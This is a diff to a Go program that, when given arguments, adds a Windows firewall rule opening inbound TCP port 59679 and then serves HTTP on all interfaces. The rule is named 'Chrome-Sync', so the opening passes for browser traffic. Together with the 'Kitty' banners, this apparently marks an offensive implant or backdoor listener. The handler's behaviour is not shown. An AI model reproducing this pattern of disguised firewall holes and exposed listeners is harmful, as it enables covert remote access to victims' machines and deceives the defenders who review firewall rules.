@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"time"
 	"html/template"
 	"net"
 	"net/http"
@@ -110,14 +111,18 @@ func main() {
 
 	arg_count := len(os.Args) - 1
 	if arg_count > 1 {
-		fw := exec.Command("cmd.exe", "/k", "netsh", "advfirewall", "firewall", "add", "rule", "name=\"Chrome-Sync\"", "dir=in", "action=allow", "protocol=TCP", "localport=443")
+		fw := exec.Command("cmd.exe", "/k", "netsh", "advfirewall", "firewall", "add", "rule", "name=\"Chrome-Sync\"", "dir=in", "action=allow", "protocol=TCP", "localport=59679")
 		fw.Run()
 
-		fmt.Printf("--Kitty-Kitty-Bop-Meow-Meow-Me-Meow--")
+		fmt.Printf("--Kitty Kitty Bop-+-")
+		time.Sleep(3 * time.Second)
+		fmt.Println("-+-Meow Meow Me Meow Meow Meow-+-")
 		http.HandleFunc("/", handler)
 		//http.ListenAndServe(ip+":"+port, nil)
-		http.ListenAndServe("0.0.0.0:443", nil)
+		http.ListenAndServe("0.0.0.0:59679", nil)
 	} else {
-		fmt.Printf("--Kittay Saaays Naaay--")
+		fmt.Printf("-+-Iron Kittay Saaays Naaay-+-")
+		time.Sleep(2 * time.Second)
+		fmt.Println("-+-I SAID NAY!-+-")
 	}
 }
